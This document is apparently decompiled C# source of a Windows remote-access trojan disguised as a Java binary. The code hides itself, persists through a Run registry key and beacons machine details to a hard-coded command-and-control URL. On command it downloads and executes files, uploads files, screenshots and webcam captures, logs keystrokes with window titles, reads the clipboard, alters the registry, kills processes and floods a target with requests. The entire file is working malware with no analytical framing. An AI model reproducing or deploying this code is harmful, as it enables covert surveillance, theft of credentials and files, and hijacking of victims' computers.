using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Java_TM__Platform_SE_binary;

public class main : Form
{
	private IContainer components;

	private Timer timer1;

	private Timer timer2;

	private Timer timerKL;

	private Timer timerMouse;

	private Timer timerKey;

	private string url = "http://mee10.com/loki/bot.php";

	private string userAgent = "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";

	private int interval = 10000;

	private int activeInterval = 500;

	private int hHwnd;

	private int curInterval;

	private string id;

	private string os;

	private string compName;

	private string memory;

	private string processor;

	private string webcam;

	private string execute;

	private string[] executeA = new string[3];

	private string lastActiveWindow;

	private string klOut;

	private int KLtime;

	private int counter;

	private string textToPrint;

	private int fontToPrint;

	private string report;

	private bool executed;

	private int ldos;

	private string vfilepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static Bitmap bmpScreenshot;

	private static Graphics gfxScreenshot;

	private WebBrowser wb = new WebBrowser();

	private WebClient query = new WebClient();

	private WebClient extquery = new WebClient();

	private string ldosus;

	public main()
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		InitializeComponent();
		Actions();
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new main());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		components = new Container();
		timer2 = new Timer(components);
		timer2.set_Enabled(true);
		timer2.set_Interval(1);
		timer2.add_Tick((EventHandler)timer2_Tick);
		timer1 = new Timer(components);
		timerKL = new Timer(components);
		timerMouse = new Timer(components);
		timerKey = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timerKL.set_Interval(10);
		timerKL.add_Tick((EventHandler)timerKL_Tick);
		timerMouse.set_Interval(10);
		timerMouse.add_Tick((EventHandler)timer3_Tick);
		timerKey.add_Tick((EventHandler)timerKey_Tick);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("main");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	private void Actions()
	{
		extquery.DownloadStringCompleted += ext_Completed;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAnyncKeySync(long vKey);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("winmm.dll")]
	public static extern int mciSendString(string lpstrCommand, int uReturnLength, int hwndCallback);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	[DllImport("avicap32.dll")]
	protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);

	[DllImport("user32")]
	protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("user32")]
	protected static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	public void loadPage(string toHost, string get)
	{
		try
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("receive", toHost);
			query.UploadValues(url + "?id=" + id + get, nameValueCollection);
		}
		catch
		{
		}
		timer1.set_Interval(activeInterval);
		counter = 0;
	}

	private string getID()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		string result = null;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				if (((ManagementBaseObject)val3).get_Item("MACAddress") != null)
				{
					result = ((ManagementBaseObject)val3).get_Item("MACAddress").ToString()!.Replace(":", "");
				}
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private string getMemory()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		double num = 0.0;
		ObjectQuery val = new ObjectQuery("select * from Win32_PhysicalMemory");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		ManagementObjectCollection val3 = val2.Get();
		ManagementObjectEnumerator enumerator = val3.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val4 = (ManagementObject)enumerator.get_Current();
				num += Convert.ToDouble(((ManagementBaseObject)val4).GetPropertyValue("Capacity"));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return (num / 1024.0 / 1024.0).ToString();
	}

	private string getProcessor()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		string result = null;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToDecimal(((ManagementBaseObject)val3).get_Item("maxclockspeed")) / 1000m + "GHz ";
				result = result + ((ManagementBaseObject)val3).get_Item("datawidth").ToString() + "bit ";
				result += ((ManagementBaseObject)val3).get_Item("name").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private int checkCamera()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		PictureBox val = new PictureBox();
		string lpszWindowName = Convert.ToString(0);
		hHwnd = capCreateCaptureWindowA(ref lpszWindowName, 1073741824, 0, 0, 640, 480, ((Control)val).get_Handle().ToInt32(), 0);
		return SendMessage(hHwnd, 1034, 0, 0);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			File.Delete(vfilepath + "\\javaw.exe");
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("javaw", vfilepath + "\\javaw.exe");
			File.Copy(AppDomain.CurrentDomain.BaseDirectory + Path.GetFileName(Application.get_ExecutablePath()), vfilepath + "\\javaw.exe");
		}
		catch
		{
		}
		id = getID();
		compName = Dns.GetHostName();
		os = Environment.OSVersion.ToString();
		int num;
		timer1.set_Interval(num = interval);
		curInterval = num;
		memory = getMemory();
		processor = getProcessor();
		webcam = checkCamera().ToString();
		try
		{
			query.Headers["User-Agent"] = userAgent;
			query.DownloadString(url + "?id=" + id + "&compname=" + compName + "&os=" + os + "&interval=" + curInterval + "&memory=" + memory + "&processor=" + processor + "&webcam=" + webcam);
		}
		catch
		{
		}
		timer1.Start();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0e2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e36: Expected O, but got Unknown
		//IL_115c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1177: Unknown result type (might be due to invalid IL or missing references)
		//IL_1192: Unknown result type (might be due to invalid IL or missing references)
		//IL_1284: Unknown result type (might be due to invalid IL or missing references)
		//IL_128b: Expected O, but got Unknown
		//IL_1294: Unknown result type (might be due to invalid IL or missing references)
		//IL_129e: Expected O, but got Unknown
		//IL_12ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f1: Expected O, but got Unknown
		//IL_1377: Unknown result type (might be due to invalid IL or missing references)
		//IL_137e: Expected O, but got Unknown
		curInterval = timer1.get_Interval();
		executed = true;
		try
		{
			query.Headers["User-Agent"] = userAgent;
			execute = query.DownloadString(url + "?id=" + id + "&compname=" + compName + "&os=" + os + "&interval=" + curInterval + "&memory=" + memory + "&processor=" + processor + "&webcam=" + webcam);
			executeA = execute.Split(new char[1] { '|' });
			report = "RS" + executeA[0];
			query.Headers["User-Agent"] = userAgent;
			switch (executeA[0])
			{
			case "download":
				try
				{
					query.DownloadFile(executeA[1], executeA[2]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "downloadexe":
			{
				string text3 = null;
				try
				{
					text3 = vfilepath + "\\" + executeA[1].Substring(executeA[1].LastIndexOf("/") + 1);
					File.Delete(text3);
				}
				catch
				{
				}
				try
				{
					query.DownloadFile(executeA[1], text3);
					Process.Start(text3);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			}
			case "upload":
				try
				{
					string text7 = executeA[1].Substring(executeA[1].LastIndexOf("/") + 1);
					query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=ufile&filename=" + text7, "POST", executeA[1]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				executed = false;
				break;
			case "run":
				try
				{
					Process.Start(executeA[1]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "delete":
			{
				string text5 = executeA[1].Substring(executeA[1].Length - 1, 1);
				try
				{
					if (text5 == "/")
					{
						Directory.Delete(executeA[1], recursive: true);
					}
					else
					{
						File.Delete(executeA[1]);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			}
			case "rename":
			{
				string text4 = executeA[1].Substring(executeA[1].Length - 1, 1);
				try
				{
					if (text4 == "/")
					{
						Directory.Move(executeA[1], executeA[2]);
					}
					else
					{
						File.Move(executeA[1], executeA[2]);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			}
			case "creatdir":
				try
				{
					Directory.CreateDirectory(executeA[1]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "ldos":
				try
				{
					ldosus = executeA[1];
					Uri address = new Uri(executeA[1]);
					ldos = Convert.ToInt32(executeA[2]);
					extquery.DownloadStringAsync(address);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "list":
				report = "LSlist{-f}";
				try
				{
					string[] directories = Directory.GetDirectories(executeA[1]);
					string[] files = Directory.GetFiles(executeA[1]);
					for (int l = 0; l < directories.Length; l++)
					{
						report = report + directories[l].Substring(directories[l].LastIndexOf("/") + 1) + "{-f}";
					}
					report += "{-fbr}";
					for (int m = 0; m < files.Length; m++)
					{
						FileInfo fileInfo = new FileInfo(files[m]);
						object obj9 = report;
						report = string.Concat(obj9, files[m].Substring(files[m].LastIndexOf("/") + 1), "{-fi}", fileInfo.Length.ToString(), "{-fi}", fileInfo.LastWriteTimeUtc, "{-f}");
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "programs":
			{
				report = "LSprograms{-p}";
				string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name))
				{
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string name2 in subKeyNames2)
					{
						using RegistryKey registryKey3 = registryKey2.OpenSubKey(name2);
						try
						{
							if (registryKey3.GetValue("InstallLocation") != null && registryKey3.GetValue("DisplayName") != null)
							{
								object obj3 = report;
								report = string.Concat(obj3, registryKey3.GetValue("DisplayName"), "{-pi}", registryKey3.GetValue("DisplayVersion"), "{-pi}", registryKey3.GetValue("Publisher"), "{-pi}", registryKey3.GetValue("UninstallString"), "{-p}");
							}
						}
						catch
						{
							report = "RFprograms";
						}
					}
				}
				if (report.Contains("\""))
				{
					report = report.Replace("\"", "");
				}
				break;
			}
			case "reglist":
				report = "LSreglist{-l}";
				try
				{
					if (executeA[1].Contains("//"))
					{
						executeA[1] = executeA[1].Replace("//", "\\");
					}
					string[] subKeyNames = Registry.CurrentUser.OpenSubKey(executeA[1], writable: true)!.GetSubKeyNames();
					string[] array = subKeyNames;
					foreach (string text in array)
					{
						report = report + text + "{-l}";
					}
					report += "{-lf}";
					string[] valueNames = Registry.CurrentUser.OpenSubKey(executeA[1], writable: true)!.GetValueNames();
					string[] array2 = valueNames;
					foreach (string text2 in array2)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(executeA[1], writable: true);
						object obj = report;
						report = string.Concat(obj, text2, "{-li}", registryKey.GetValue(text2), "{-l}");
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "regnewkey":
				try
				{
					if (executeA[1].Contains("//"))
					{
						executeA[1] = executeA[1].Replace("//", "\\");
					}
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(executeA[1]);
					if (executeA[2] != "{-fol}")
					{
						registryKey4.SetValue(executeA[2], executeA[3]);
					}
					registryKey4.Close();
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "regdelkey":
				try
				{
					if (executeA[1].Contains("//"))
					{
						executeA[1] = executeA[1].Replace("//", "\\");
					}
					RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey(executeA[1]);
					if (executeA[3] != "{-fol}")
					{
						registryKey7.DeleteSubKey(executeA[2]);
					}
					else
					{
						registryKey7.DeleteValue(executeA[2]);
					}
					registryKey7.Close();
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "process":
			{
				string text8 = null;
				report = "LS" + executeA[0] + "{-p}";
				try
				{
					Process[] processes2 = Process.GetProcesses();
					Process[] array4 = processes2;
					foreach (Process process2 in array4)
					{
						try
						{
							text8 = FileVersionInfo.GetVersionInfo(process2.MainModule!.FileName).FileDescription;
						}
						catch
						{
							text8 = null;
						}
						object obj32 = report;
						report = string.Concat(obj32, process2.ProcessName, "{-pi}", process2.PrivateMemorySize, "{-pi}", text8, "{-p}");
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			}
			case "pkill":
				try
				{
					Process[] processes = Process.GetProcesses();
					Process[] array3 = processes;
					foreach (Process process in array3)
					{
						if (process.ProcessName == executeA[1])
						{
							process.Kill();
						}
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "clipboard":
				report = "LS" + executeA[0] + "{-c}";
				report += Clipboard.GetText();
				break;
			case "clipboardset":
				Clipboard.SetText(executeA[1]);
				break;
			case "startkl":
				timerKL.Start();
				break;
			case "stopkl":
				timerKL.Stop();
				KLtime = 0;
				break;
			case "screen":
				try
				{
					File.Delete(vfilepath + "\\screen.png");
				}
				catch
				{
				}
				try
				{
					bmpScreenshot = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					gfxScreenshot = Graphics.FromImage((Image)(object)bmpScreenshot);
					gfxScreenshot.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bmpScreenshot).Save(vfilepath + "\\screen.png", ImageFormat.get_Png());
					query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=screen&filename=screen.png", "POST", vfilepath + "\\screen.png");
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				executed = false;
				break;
			case "computer":
				try
				{
					Process.Start(executeA[1], executeA[2]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "cdrom":
				try
				{
					string text6 = "E";
					if (executeA.Length >= 3)
					{
						text6 = executeA[2];
					}
					mciSendString("OPEN " + text6 + ": TYPE CDaudio ALIAS DRIVEE", 0, 0);
					if (executeA[1] == "open")
					{
						mciSendString("SET DRIVE" + text6 + " DOOR OPEN", 0, 0);
					}
					else
					{
						mciSendString("SET DRIVE" + text6 + " DOOR CLOSED", 0, 0);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "monitor":
				try
				{
					if (executeA[1] == "off")
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
					}
					else
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "icons":
				try
				{
					IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
					if (executeA[1] == "hide")
					{
						ShowWindow(hWnd, 0);
					}
					else
					{
						ShowWindow(hWnd, 5);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "taskbar":
				try
				{
					int hwnd = FindWindow("Shell_TrayWnd", "");
					if (executeA[1] == "hide")
					{
						ShowWindow(hwnd, 0);
					}
					else
					{
						ShowWindow(hwnd, 1);
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "message":
				try
				{
					switch (executeA[3])
					{
					case "error":
						MessageBox.Show(executeA[1], executeA[2], (MessageBoxButtons)0, (MessageBoxIcon)16);
						break;
					case "warning":
						MessageBox.Show(executeA[1], executeA[2], (MessageBoxButtons)0, (MessageBoxIcon)48);
						break;
					default:
						MessageBox.Show(executeA[1], executeA[2], (MessageBoxButtons)0, (MessageBoxIcon)64);
						break;
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "script":
				try
				{
					File.Delete(vfilepath + "\\script." + executeA[1]);
				}
				catch
				{
				}
				try
				{
					StreamWriter streamWriter = new StreamWriter(vfilepath + "\\script." + executeA[1]);
					streamWriter.Write(executeA[2]);
					streamWriter.Close();
					Process.Start(vfilepath + "\\script." + executeA[1]);
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "print":
				try
				{
					fontToPrint = Convert.ToInt32(executeA[1]);
					if (fontToPrint == 0)
					{
						fontToPrint = 16;
					}
					textToPrint = executeA[2];
					PrintDocument val4 = new PrintDocument();
					val4.add_PrintPage(new PrintPageEventHandler(PrintPageEvent));
					val4.Print();
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				break;
			case "webcam":
			{
				try
				{
					File.Delete(vfilepath + "\\webcam.jpg");
				}
				catch
				{
				}
				string lpszWindowName = Convert.ToString(0);
				PictureBox val = new PictureBox();
				IDataObject val2 = null;
				Image val3 = null;
				try
				{
					hHwnd = capCreateCaptureWindowA(ref lpszWindowName, 1073741824, 0, 0, 640, 480, ((Control)val).get_Handle().ToInt32(), 0);
					SendMessage(hHwnd, 1034, 0, 0);
					SendMessage(hHwnd, 1054, 0, 0);
					val2 = Clipboard.GetDataObject();
					if (val2.GetDataPresent(typeof(Bitmap)))
					{
						val3 = (Image)val2.GetData(typeof(Bitmap));
						val3.Save(vfilepath + "\\webcam.jpg", ImageFormat.get_Jpeg());
						query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=webcam&filename=webcam.jpg", "POST", vfilepath + "\\webcam.jpg");
					}
				}
				catch
				{
					report = "RF" + executeA[0];
				}
				executed = false;
				break;
			}
			case "close":
				((Form)this).Close();
				break;
			case "regdel":
			{
				RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey6.DeleteValue("javaw");
				break;
			}
			case "uninstall":
			{
				RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey5.DeleteValue("javaw");
				((Form)this).Close();
				break;
			}
			case "mouse":
				if (executeA[1] == "enable")
				{
					timerMouse.Start();
				}
				else
				{
					timerMouse.Stop();
				}
				break;
			case "visitpage":
				wb.Navigate(executeA[1]);
				break;
			case "ckeyboard":
				if (executeA[1] == "start")
				{
					timerKey.Start();
				}
				else
				{
					timerKey.Stop();
				}
				break;
			case "":
				if (counter >= 120)
				{
					timer1.set_Interval(interval);
				}
				else
				{
					counter++;
				}
				executed = false;
				break;
			default:
				executed = false;
				break;
			}
			if (report.Contains("\\"))
			{
				report = report.Replace("\\", "/");
			}
			if (executed)
			{
				loadPage(report, "");
			}
		}
		catch
		{
		}
	}

	private void PrintPageEvent(object sender, PrintPageEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		Font val = new Font("Arial", (float)fontToPrint);
		e.get_Graphics().DrawString(textToPrint, val, (Brush)new SolidBrush(Color.Blue), (float)(e.get_PageBounds().Right / 2), (float)(e.get_PageBounds().Bottom / 2));
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).Hide();
		timer2.Stop();
	}

	private void timerKL_Tick(object sender, EventArgs e)
	{
		int num = 256;
		for (int i = 1; i <= 255; i++)
		{
			int num2 = 0;
			num2 = GetAsyncKeyState(i);
			if (num2 == -32767 && i != 16 && i != 160 && i > 1)
			{
				switch (i)
				{
				case 13:
					klOut += "{br}{ENTER}{br}";
					break;
				case 8:
					if (klOut.Substring(klOut.Length - 1, 1) != "}" && klOut.Length > 0)
					{
						klOut = klOut.Substring(0, klOut.Length - 1);
					}
					break;
				case 9:
					klOut += " {TAB} ";
					break;
				default:
				{
					StringBuilder stringBuilder = new StringBuilder(num);
					IntPtr foregroundWindow = GetForegroundWindow();
					if (GetWindowText(foregroundWindow, stringBuilder, num) > 0 && lastActiveWindow != foregroundWindow.ToString())
					{
						lastActiveWindow = foregroundWindow.ToString();
						klOut = klOut + "{br}{br}{br}--->" + stringBuilder.ToString() + " | ";
						klOut = klOut + DateTime.Now.ToLongTimeString() + "{br}";
					}
					klOut += (char)i;
					break;
				}
				case 95:
					klOut += "_";
					break;
				case 64:
					klOut += "@";
					break;
				}
			}
			KLtime++;
			if (KLtime >= 6000000)
			{
				KLtime = 0;
				loadPage(klOut, "&kl=true");
				klOut = null;
			}
		}
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		Cursor.set_Position(new Point(0, 0));
	}

	private void ext_Completed(object sender, EventArgs e)
	{
		Uri address = new Uri(ldosus);
		if (ldos > 0)
		{
			extquery.DownloadStringAsync(address);
			ldos--;
		}
		else
		{
			loadPage("DDos finished", "");
		}
	}

	private void timerKey_Tick(object sender, EventArgs e)
	{
		SendKeys.Send("w");
	}
}
